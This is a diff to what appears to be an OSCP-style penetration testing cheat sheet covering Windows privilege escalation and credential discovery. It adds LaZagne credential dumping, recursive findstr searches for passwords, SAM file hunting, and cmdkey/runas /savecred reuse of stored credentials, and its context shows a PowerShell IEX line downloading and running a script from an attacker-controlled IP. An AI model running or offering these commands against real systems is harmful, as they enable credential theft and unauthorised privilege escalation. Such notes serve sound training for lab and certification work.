@@ -63,6 +63,7 @@
     - [Sherlock](#sherlock)
     - [PrivescCheck](#privesccheck)
     - [Snaffler](#snaffler)
+    - [LaZagne](#lazagne)
     - [BloodHound](#bloodhound)
     - [cmd](#cmd)
   - [Linux](#linux-2)
@@ -656,10 +657,17 @@ IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.36/PrivescC
 ```
 
 ### Snaffler
+Share Folder
 ```powershell
 wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.150/Snaffler.exe
 
 .\Snaffler.exe -d oscp.exam -v data
+```
+
+### LaZagne
+Credential Discovery
+```powershell
+.\lazagne.exe all
 ```
 
 ### BloodHound
@@ -711,6 +719,13 @@ jq '.nodes[].label'
 Get-Childitem -Path C:\windows.old -Include *SAM -Recurse -force -ErrorAction SilentlyContinue
 
 findstr /SIM /C:"pass" *.txt *.ini *.cfg *.config *.xml
+findstr /spin "password" *.*
+
+where /R C:\ *.config
+
+# savecred
+cmdkey /list
+runas /savecred /user:oscp\bob "COMMAND HERE"
 
 # Powershell History
 (Get-PSReadLineOption).HistorySavePath
